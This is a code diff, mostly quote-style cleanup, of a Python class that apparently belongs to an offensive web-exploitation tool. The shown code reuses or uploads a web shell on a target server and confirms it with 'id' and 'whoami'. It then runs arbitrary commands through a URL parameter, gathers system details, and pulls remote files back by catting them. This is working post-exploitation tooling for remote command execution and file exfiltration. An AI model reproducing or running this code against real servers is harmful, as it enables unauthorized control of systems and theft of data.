@@ -23,9 +23,9 @@ class OSShellHandler:
         self.engine = engine
         self.requester = engine.requester
         self.config = engine.config
-        self.verbose = self.config.get('verbose', False)
+        self.verbose = self.config.get("verbose", False)
         self._shell_url: Optional[str] = None
-        self._shell_param: str = 'cmd'
+        self._shell_param: str = "cmd"
 
     # ─── public API ──────────────────────────────────────────────────
 
@@ -44,8 +44,8 @@ class OSShellHandler:
         # 1. Try existing shells
         shell_info = self._find_existing_shell()
         if shell_info:
-            self._shell_url = shell_info['url']
-            self._shell_param = shell_info.get('password', 'cmd')
+            self._shell_url = shell_info["url"]
+            self._shell_param = shell_info.get("password", "cmd")
             print(f"{Colors.success('Reusing existing shell session')}")
         else:
             # 2. Attempt fresh upload
@@ -69,6 +69,7 @@ class OSShellHandler:
         """Query the database for a previously uploaded shell."""
         try:
             from utils.database import Database
+
             db = Database()
             shells = db.get_shells()
             if shells:
@@ -81,13 +82,14 @@ class OSShellHandler:
         """Attempt to upload a new web shell using ShellUploader."""
         try:
             from modules.uploader import ShellUploader
+
             uploader = ShellUploader(self.engine)
             uploader.run(findings, forms)
 
             # Check if any shell was registered
             shell_info = self._find_existing_shell()
             if shell_info:
-                return shell_info['url']
+                return shell_info["url"]
         except Exception as e:
             if self.verbose:
                 print(f"{Colors.error(f'Shell upload failed: {e}')}")
@@ -97,7 +99,7 @@ class OSShellHandler:
 
     def _verify_shell(self) -> bool:
         """Send a simple ``id`` / ``whoami`` to confirm the shell works."""
-        for cmd in ('id', 'whoami'):
+        for cmd in ("id", "whoami"):
             result = self._exec(cmd)
             if result and len(result.strip()) > 0:
                 print(f"{Colors.success(f'Shell verified — {cmd}: {result.strip()[:80]}')}")
@@ -105,7 +107,7 @@ class OSShellHandler:
         return False
 
     # Characters that could allow command chaining in a shell context
-    _SHELL_META = set(';|&`$(){}')
+    _SHELL_META = set(";|&`$(){}")
 
     def _exec(self, cmd: str) -> Optional[str]:
         """Execute *cmd* through the web shell and return stdout."""
@@ -116,9 +118,10 @@ class OSShellHandler:
             return None
         try:
             from urllib.parse import quote as _url_quote
-            sep = '&' if '?' in self._shell_url else '?'
+
+            sep = "&" if "?" in self._shell_url else "?"
             url = f"{self._shell_url}{sep}{self._shell_param}={_url_quote(cmd)}"
-            resp = self.requester.request(url, 'GET')
+            resp = self.requester.request(url, "GET")
             return resp.text if resp else None
         except Exception:
             return None
@@ -141,15 +144,15 @@ class OSShellHandler:
             cmd = cmd.strip()
             if not cmd:
                 continue
-            if cmd.lower() in ('exit', 'quit'):
+            if cmd.lower() in ("exit", "quit"):
                 break
-            if cmd.lower() == 'help':
+            if cmd.lower() == "help":
                 self._print_help()
                 continue
-            if cmd.lower() == 'sysinfo':
+            if cmd.lower() == "sysinfo":
                 self._sysinfo()
                 continue
-            if cmd.lower().startswith('download '):
+            if cmd.lower().startswith("download "):
                 self._download(cmd[9:].strip())
                 continue
 
@@ -164,11 +167,11 @@ class OSShellHandler:
     def _sysinfo(self) -> None:
         """Collect basic system information."""
         commands = [
-            ('OS', 'uname -a'),
-            ('User', 'whoami'),
-            ('Hostname', 'hostname'),
-            ('IP', 'hostname -I 2>/dev/null || ifconfig 2>/dev/null | head -5'),
-            ('Kernel', 'cat /proc/version 2>/dev/null'),
+            ("OS", "uname -a"),
+            ("User", "whoami"),
+            ("Hostname", "hostname"),
+            ("IP", "hostname -I 2>/dev/null || ifconfig 2>/dev/null | head -5"),
+            ("Kernel", "cat /proc/version 2>/dev/null"),
         ]
         print(f"\n{Colors.BOLD}System Information{Colors.RESET}")
         for label, cmd in commands:
@@ -181,14 +184,15 @@ class OSShellHandler:
         """Download a remote file by catting it through the shell."""
         import os
         from config import Config
-        result = self._exec(f'cat {remote_path}')
+
+        result = self._exec(f"cat {remote_path}")
         if not result:
             print(f"{Colors.error('Could not read remote file')}")
             return
         local_name = os.path.basename(remote_path)
         local_path = os.path.join(Config.REPORTS_DIR, local_name)
         os.makedirs(Config.REPORTS_DIR, exist_ok=True)
-        with open(local_path, 'w') as f:
+        with open(local_path, "w") as f:
             f.write(result)
         print(f"{Colors.success(f'Saved to {local_path}')}")
 
